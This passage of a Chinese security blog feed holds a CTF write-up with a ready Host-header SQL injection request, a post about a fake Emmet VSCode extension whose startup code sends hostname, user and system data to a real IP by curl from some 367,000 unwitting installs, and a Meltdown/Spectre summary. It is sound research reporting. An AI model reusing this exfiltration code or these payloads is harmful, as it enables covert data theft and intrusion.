}&lt;/code&gt;&lt;p&gt;以上是注册功能的代码，比较简单。用户名和密码是必填项，邮箱如果没有填写，则自动设置为”用户名@网站域名“。最后将三者传入create方法，create方法其实就是拼接了一个INSERT语句。&lt;/p&gt;&lt;p&gt;值得注意的是，网站域名是从&lt;code class=&quot;inline&quot;&gt;arg(&#39;HTTP_HOST&#39;)&lt;/code&gt;中获取，也就是从&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;中获取。因为&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;没有经过转义，我们只需要在HTTP头Host值中引入单引号，即可造成一个SQL注入漏洞。&lt;/p&gt;&lt;p&gt;但email变量经过了&lt;code class=&quot;inline&quot;&gt;filter_var($email, FILTER_VALIDATE_EMAIL)&lt;/code&gt;的检测，我们首先要绕过之。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03  FILTER_VALIDATE_EMAIL 绕过 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这就是今天第一个trick。这个点早在当初PHPMailer的&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html&quot;&gt;CVE-2016-10033&lt;/a&gt;就提到过。&lt;/p&gt;&lt;p&gt;RFC 3696规定，邮箱地址分为local part和domain part两部分。local part中包含特殊字符，需要如下处理：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;将特殊字符用&lt;code class=&quot;inline&quot;&gt;\&lt;/code&gt;转义，如&lt;code class=&quot;inline&quot;&gt;Joe\&#39;Blow@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;或将local part包裹在双引号中，如&lt;code class=&quot;inline&quot;&gt;&quot;Joe&#39;Blow&quot;@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;local part长度不超过64个字符&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;虽然PHP没有完全按照RFC 3696进行检测，但支持上述第2种写法。所以，我们可以利用之绕过&lt;code class=&quot;inline&quot;&gt;FILTER_VALIDATE_EMAIL&lt;/code&gt;的检测。&lt;/p&gt;&lt;p&gt;因为代码中邮箱是用户名、@、Host三者拼接而成，但用户名是经过了转义的，所以单引号只能放在Host中。我们可以传入用户名为&lt;code class=&quot;inline&quot;&gt;&quot;&lt;/code&gt;，Host为&lt;code class=&quot;inline&quot;&gt;aaa&#39;&quot;@example.com&lt;/code&gt;，最后拼接出来的邮箱为&lt;code class=&quot;inline&quot;&gt;&quot;@aaa&#39;&quot;@example.com&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这个邮箱是合法的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2c3ebaa43d148bcb1077ef794875179a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;374&quot;&gt;&lt;p&gt;这个邮箱包含单引号，将闭合SQL语句中原本的单引号，造成SQL注入漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04  绕过 Nginx Host 限制&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第二个trick。&lt;/p&gt;&lt;p&gt;我们尝试向目标注册页面发送刚才构造好的用户名和Host：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-036f8b0da6617ec28407606900723755_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;直接显示404，似乎并没有进入PHP的处理过程。&lt;/p&gt;&lt;p&gt;这就回到问题的本质了，Host头究竟是做什么的？&lt;/p&gt;&lt;p&gt;众所周知，如果我们在浏览器里输入&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;，浏览器将先请求DNS服务器，获取到目标服务器的IP地址，之后的TCP通信将和域名没有关系。那么，如果一个服务器上有多个网站，那么Nginx在接收到HTTP包后，将如何区分？&lt;/p&gt;&lt;p&gt;这就是Host的作用：用来区分用户访问的究竟是哪个网站（在Nginx中就是Server块）。&lt;/p&gt;&lt;p&gt;如果Nginx发现我们传入的Host找不到对应的Server块，将会发送给默认的Server块，也就是我们通过IP地址直接访问的那个Nginx默认页面：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-29368ce91ff8f4dd421ce72682e427e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;244&quot;&gt;&lt;p&gt;默认网站并没有&lt;code class=&quot;inline&quot;&gt;/main/register&lt;/code&gt;这个请求的处理方法，所以自然会返回404。&lt;/p&gt;&lt;p&gt;这里给出解决这个问题的两个方法，也许还有更多新方法我没有想到，欢迎补充。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法1&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Nginx在处理Host的时候，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，我们可以设置Host的值为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw:xxx&#39;&quot;@example.com&lt;/code&gt;，这样就能访问到目标Server块&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7e9214ed2dd45bb78f1f021ce22714cc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;229&quot;&gt;&lt;p&gt;如上图，成功触发SQL报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法2&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当我们传入两个Host头的时候，Nginx将以第一个为准，而PHP-FPM将以第二个为准。&lt;/p&gt;&lt;p&gt;也就是说，如果我传入：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Host: 2018.mhz.pw
Host: xxx&#39;&quot;@example.com&lt;/code&gt;&lt;p&gt;Nginx将认为Host为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw&lt;/code&gt;，并交给目标Server块处理；但PHP中使用&lt;code class=&quot;inline&quot;&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;取到的值却是&lt;code class=&quot;inline&quot;&gt;xxx&#39;&quot;@example.com&lt;/code&gt;。这样也可以绕过：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b58641bf79aa32b94998873424102a2b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;225&quot;&gt;&lt;p&gt;这个方法我以前在某群里提到过，只有Nginx+PHP会出现这个问题，Apache的情况下将会是另一个样子，此处不展开讨论。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05  Mysql 5.7 INSERT注入方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第三个trick。&lt;/p&gt;&lt;p&gt;既然已经触发了SQL报错，说明SQL注入近在眼前。通过阅读源码中包含的SQL结构，我们知道flag在flags表中，所以不废话，直接注入读取该表。&lt;/p&gt;&lt;p&gt;&lt;b&gt;插入显示位&lt;/b&gt;&lt;/p&gt;&lt;p&gt;因为用户成功登录后，将会显示出该用户的邮箱地址，所以我们可以将数据插入到这个位置。发送如下数据包：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /main/register HTTP/1.1
Host: 2018.mhz.pw
Host: &#39;),(&#39;t123&#39;,md5(12123),(select(flag)from(flags)))#&quot;@a.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------356678531
Content-Length: 176

----------356678531
Content-Disposition: form-data; name=&quot;username&quot;

&quot;a
----------356678531
Content-Disposition: form-data; name=&quot;password&quot;

aaa
----------356678531--&lt;/code&gt;&lt;p&gt;可见，我闭合了INSERT语句，并插入了一个新用户&lt;code class=&quot;inline&quot;&gt;t123&lt;/code&gt;，并将flag读取到email字段。登录该用户，获取flag：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-47fe38613349c23e629dd7964162fceb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;245&quot;&gt;&lt;p&gt;flag是支付宝红包口令。:)&lt;/p&gt;&lt;p&gt;&lt;b&gt;报错注入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了降低难度，我特地给出了Mysql的报错信息，没想到居然还增加了难度，这一点我没考虑到，还是 @burnegg 同学提出来的解决方法。&lt;/p&gt;&lt;p&gt;很多同学上来就测试报错注入，但这里有两个需要绕过的坑：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;由于邮箱的限制，注入语句长度需要小于64位&lt;/li&gt;&lt;li&gt;Mysql 5.7 默认开启严格模式，部分字符串连接语法将导致错误：&lt;code class=&quot;inline&quot;&gt;ErrorInfo: Truncated incorrect INTEGER value&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们可以不使用字符串连接语法，而使用&lt;code class=&quot;inline&quot;&gt;&amp;lt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;&amp;gt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;=&lt;/code&gt;等比较符号来触发漏洞：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27c7003ec97ae50df5a33d57dd11ff6f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;252&quot;&gt;&lt;p&gt;更多INSERT注入相关内容，可以阅读&lt;a href=&quot;https://www.exploit-db.com/docs/english/41275-mysql-injection-in-update,-insert,-and-delete.pdf&quot;&gt;MySQL Injection in Update, Insert and Delete&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x06  一个总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题目出出来以后，有千余同学参加，最快拿到支付宝红包的是 @超威蓝猫 ，大概在初二凌晨1点。&lt;/p&gt;&lt;p&gt;除了安全研究者以外，有一些程序员同学也参与了游戏，但因为不熟悉CTF比赛和安全相关漏洞，所以有的人跑偏了，没有聚焦在漏洞和安全技术本身，而去猜测红包口令是否藏在图片或者其他什么地方。&lt;/p&gt;&lt;p&gt;希望这次游戏给你带来不仅是过年的欢乐，而且有技术的提升~&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文为授权转载，原文链接：&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html&quot;&gt;攻击LNMP架构Web应用的几个小Tricks | 离别歌&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-02-22-33919193</guid>
<pubDate>Thu, 22 Feb 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>VSCODE EXTENSION 钓鱼</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-23-33203374.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33203374&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f98183e24f6e09f4c4470311dcc1754_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt;&lt;a href=&quot;https://www.zhihu.com/people/D0n9&quot;&gt;栋栋的栋&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;灵感来源于 fate0 这篇 &lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;Package 钓鱼&lt;/a&gt;&lt;/p&gt;&lt;p&gt;随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)&lt;/p&gt;&lt;p&gt;5$买了一台廉价vps用作收集用户数据，收集以下信息。&lt;/p&gt;&lt;p&gt;· hostname&lt;/p&gt;&lt;p&gt;· whoami&lt;/p&gt;&lt;p&gt;· date&lt;/p&gt;&lt;p&gt;· uname&lt;/p&gt;&lt;p&gt;· ip&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; desc db;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(4) unsigned | NO   | PRI | NULL    | auto_increment |
| hostname | varchar(32)     | NO   |     | NULL    |                |
| whoami   | varchar(32)     | NO   |     | NULL    |                |
| date     | varchar(32)     | NO   |     | NULL    |                |
| uname    | varchar(32)     | NO   |     | NULL    |                |
| ide      | varchar(32)     | NO   |     | NULL    |                |
| ip       | varchar(32)     | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+&lt;/code&gt;&lt;p&gt;获取ip方式使用$_SERVER[“REMOTE_ADDR”]; 所以可能会不准确。&lt;/p&gt;&lt;p&gt;好了，回到主题&lt;/p&gt;&lt;p&gt;选择制作Visual Studio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;npm install -g yo generator-code&lt;br&gt;npm install -g vsce&lt;/i&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1818729f547600a35585b5d658ebbb6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;999&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块&lt;b&gt;import { execSync } from ‘child_process’;&lt;/b&gt;，就可以使用exec() execSync() 执行命令&lt;/p&gt;&lt;p&gt;./test/src/extension.ts&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;execSync(&#39;curl &quot;http://45.32.40.141/&quot; --user-agent &quot;$(echo `hostname`, `whoami`, `date &quot;+%Y-%m-%d %H:%M:%S&quot;`, `uname`, vscode | base64)&quot;&#39;)&lt;/code&gt;&lt;p&gt;执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。&lt;/p&gt;&lt;p&gt;考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序&lt;/p&gt;&lt;p&gt;还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动&lt;/p&gt;&lt;p&gt;./test/src/package.json&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;改为&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;*&quot;,
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到 &lt;a href=&quot;https://marketplace.visualstudio.com/&quot;&gt;https://marketplace.visualstudio.com&lt;/a&gt; 了，几分钟就审核通过，那肯定是自动审核了&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f0de38638fb609bf3735f425e179965_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1208&quot; data-rawheight=&quot;429&quot;&gt;&lt;p&gt;可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6330c09e78724f67db3c0f13db34b574_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1276&quot; data-rawheight=&quot;1026&quot;&gt;&lt;p&gt;当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-968dacc3cca8dc97dde549349fb499b1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1159&quot; data-rawheight=&quot;667&quot;&gt;&lt;p&gt;但是在下架的时候已经有了367004次的安装量 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&quot;&gt;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0fb4230a609ecb4db8c78fd7f6bbfe41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1199&quot; data-rawheight=&quot;221&quot;&gt;&lt;p&gt;因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid 去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b0a1f77ef8df9edb87919641741b58e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;907&quot;&gt;&lt;p&gt;中招最多的国家top10，数据验证使用 &lt;a href=&quot;http://ip.taobao.com/service/getIpInfo.php&quot;&gt;http://ip.taobao.com/service/getIpInfo.php&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fee8d69e9c4468a38c6a993c61e609c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1624&quot; data-rawheight=&quot;979&quot;&gt;&lt;p&gt;思考，是什么原因导致三天达到三十几万的安装量呢？&lt;/p&gt;&lt;p&gt;这个锅官方是背定了，因为官方审核机制不严格，spam 不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。&lt;/p&gt;&lt;p&gt;ide有那么多，sublime 是使用Python写插件，JetBrains家和Eclipse用Java，Notepad++用c++，都可以按照类似思路构造出恶意插件。&lt;/p&gt;&lt;p&gt;未来会不会再出现xcodeghost事件呢？拭目以待。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ref：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&quot;&gt;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&quot;&gt;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/extensions/overview&quot;&gt;https://code.visualstudio.com/docs/extensions/overview&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://nodejs.cn/api/child_process.html&quot;&gt;http://nodejs.cn/api/child_process.html&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-23-33203374</guid>
<pubDate>Tue, 23 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>“幽灵”和“熔断”，究竟是什么？（事件汇总）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-10-32810180.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32810180&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-666c34510675547bd40b152594170c1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：fec&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;最近被「幽灵」和「熔断」刷了屏，虽然已经有各路大牛发布了相关的研究和分析，但依然听到身边有不少疑惑和紧张的声音，于是笔者整理了事件相关的内容汇总，以供大家参考。（仅为整理，欢迎大家讨论。）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;事件回顾&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018 年 1 月 3 日有消息传出说，Intel CPU 存在重大 Bug ，几乎影响所有的英特尔现代的 CPU 。后来经证实，不仅影响 Intel CPU ，其他主流 CPU 也会受到影响。&lt;/p&gt;&lt;p&gt;此次影响的漏洞主要为 2 个：Meltdown（熔断）对应编号恶意数据缓存加载 CVE-2017-5754 ，Spectre （幽灵）对应编号边界检查绕过 CVE-2017-5753 、分支目标注入 CVE-2017-5715 ，Meltdown 影响几乎所有的 Intel CPU（从1995年起）以及部分 ARM CPU 。而 Spectre 拥有更广的影响范围，Intel 、ARM、AMD 都受其影响。在 Meltdown 的情况下，一个恶意程序可以窥探操作系统的内存，并可读取自身无权限访问的数据。利用此漏洞低权限用户可以访问到本身无权限访问的内容，例如用户密码、加密密钥。Spectre 可以归纳为计算机上运行的两个程序可以相互监视，无视自身的安全界限。用户浏览器访问了含有 Spectre 的恶意利用程序，可能导致用户的帐号、密码泄漏。而在公共云服务器上，则可能打破界限，从一台虚拟机器获取到另一个用户的权限。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞成因简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这次漏洞利用了 CPU 执行中对出现故障的处理。由于现在 CPU 为了提供性能，引入了乱序执行和预测执行。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;乱序执行是指 CPU 并不是严格按照指令的顺序串行执行，而是根据相关性对指令进行分组并行执行，最后汇总处理各组指令执行的结果。&lt;/li&gt;&lt;li&gt;预测执行是 CPU 根据当前掌握的信息预测某个条件判断的结果，然后选择对应的分支提前执行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;这两种执行在遇到异常时，CPU 会丢弃之前执行的结果，将 CPU 的状态恢复到乱序执行或预测执行前的正确状态，然后继续执行正确的指令，从而保证了程序能够正确连续的执行。但是问题在于，CPU 恢复状态时并不会清除 CPU 缓存中的内容，而这两组漏洞正是利用了这一设计上的缺陷进行侧信道攻击。&lt;b&gt;乱序执行对应的利用即为 Meltdown ，而预测执行对应的利用即为 Spectre 。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞验证&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;目前 Github 给出的相应验证 Poc &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/paboldin/meltdown-exploit/&quot;&gt;https://github.com/paboldin/meltdown-exploit/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Eugnis/spectre-attack&quot;&gt;https://github.com/Eugnis/spectre-attack&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/feruxmax/meltdown&quot;&gt;https://github.com/feruxmax/meltdown&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/gkaindl/meltdown-poc&quot;&gt;https://github.com/gkaindl/meltdown-poc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/turbo/KPTI-PoC-Collection&quot;&gt;https://github.com/turbo/KPTI-PoC-Collection&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞影响&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;虽然此次漏洞影响范围较广，并且在 Github 上已有 Poc 流出，但是目前流出的 Poc 并不能直接去系统造成危害。同时由于 CPU 本身的复杂性，&lt;b&gt;暂未发现有能够造成严重危害的通用稳定的 Poc 流出&lt;/b&gt;。同时此次漏洞并不能被单独进行远程利用。&lt;b&gt;此次主要影响的为云服务厂商&lt;/b&gt;，&lt;b&gt;对普通用户的影响主要为浏览器方面&lt;/b&gt;。养成良好的上网习惯，不点开陌生人发送的连接，同时将浏览器更新为最新版本基本不会收到此次漏洞的影响。此外，目前暂未发现野生的针对该漏洞进行的攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复建议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;具体修复可参照下列各厂商安全公告相关安全公告&lt;/p&gt;&lt;p&gt;&lt;b&gt;CPU 厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Intel&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;languageid=en-fr&quot;&gt;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;amp;languageid=en-fr&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&quot;&gt;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&quot;&gt;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&quot;&gt;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ARM&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update/download-the-whitepaper&quot;&gt;https://developer.arm.com/support/security-update/download-the-whitepaper&lt;/a&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update&quot;&gt;https://developer.arm.com/support/security-update&lt;/a&gt;&lt;/p&gt;&lt;p&gt;AMD&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.amd.com/en/corporate/speculative-execution&quot;&gt;https://www.amd.com/en/corporate/speculative-execution&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;操作系统&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Microsoft微软&lt;/p&gt;&lt;ul&gt;&lt;li&gt;普通用户：&lt;a href=&quot;https://support.microsoft.com/help/4073119&quot;&gt;https://support.microsoft.com/help/4073119&lt;/a&gt;&lt;/li&gt;&lt;li&gt;服务器用户：&lt;a href=&quot;https://support.microsoft.com/help/4072698&quot;&gt;https://support.microsoft.com/help/4072698&lt;/a&gt;&lt;/li&gt;&lt;li&gt;云用户：&lt;a href=&quot;https://support.microsoft.com/help/4073235&quot;&gt;https://support.microsoft.com/help/4073235&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Red Hat&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/vulnerabilities/speculativeexecution&quot;&gt;https://access.redhat.com/security/vulnerabilities/speculativeexecution&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Linux&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://lkml.org/lkml/2017/12/4/709&quot;&gt;https://lkml.org/lkml/2017/12/4/709&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Android&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://source.android.com/security/bulletin/2018-01-01&quot;&gt;https://source.android.com/security/bulletin/2018-01-01&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Apple&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://support.apple.com/en-us/HT208394&quot;&gt;https://support.apple.com/en-us/HT208394&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;其他厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Amazon&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&quot;&gt;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Google&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&quot;&gt;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&lt;/a&gt;&lt;a 